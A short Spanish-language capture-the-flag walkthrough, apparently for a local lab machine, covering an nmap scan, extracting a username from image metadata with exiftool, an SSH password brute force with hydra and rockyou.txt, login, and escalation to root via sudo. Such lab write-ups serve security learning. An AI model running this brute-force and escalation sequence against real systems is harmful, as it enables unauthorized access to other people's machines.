`ping 172.17.0.2`
#### hacemos ping para comprobar si la maquina esta prendida
[![ping.png](https://i.postimg.cc/MGv2rc2Z/ping.png)](https://postimg.cc/zLZcyGG4)

`nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 172.17.0.2`
#### Hacemos un escaneo con Nmap para 
[![Nmap.png](https://i.postimg.cc/nhWwr0gZ/Nmap.png)](https://postimg.cc/5Xwmkqfk)

como podemos ver tenemos un puerto ssh y uno http la version del ssh no es vulnerabla asi que busquemos que hay en la web de la ip

#### Contenido de la pagina
[![kinder.png](https://i.postimg.cc/0NB6LJzV/kinder.png)](https://postimg.cc/B82QFbcF)

nos encontramos una imagen de un huevo kinder asi que lo descargamos para ver si tiene algo interesante oculto

`exiftool imagen.jpeg`
#### Vemos el contenido de la imagen 
[![secreto.png](https://i.postimg.cc/ZYFbNdJX/secreto.png)](https://postimg.cc/14X1h4nK)

vemos que el titulo de la imagen es borazuwarah y la contraseña esta en blanco 

`hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`
#### Fuerza bruta con Hydra
[![hydrah.png](https://i.postimg.cc/BZMWscSZ/hydrah.png)](https://postimg.cc/K4kpDT3C)

`ssh borazuwarah@172.17.0.2`
#### Entramos mediante SSH
[![sshborazu.png](https://i.postimg.cc/5ykkzgyw/sshborazu.png)](https://postimg.cc/dZrBP881)
estamos dentro

`sudo -l`
#### Ver que permisos tenemos
[![l.png](https://i.postimg.cc/rpcgK3jB/l.png)](https://postimg.cc/rDn5Hhvj)
vemos que tenemos permisos para elevar a usuario root

`sudo su`
#### nos volvemos root
[![sudosu.png](https://i.postimg.cc/KjdDFH4s/sudosu.png)](https://postimg.cc/WqwkwSGM)
ponemos la contraseña que encontramos y finalmente somos root


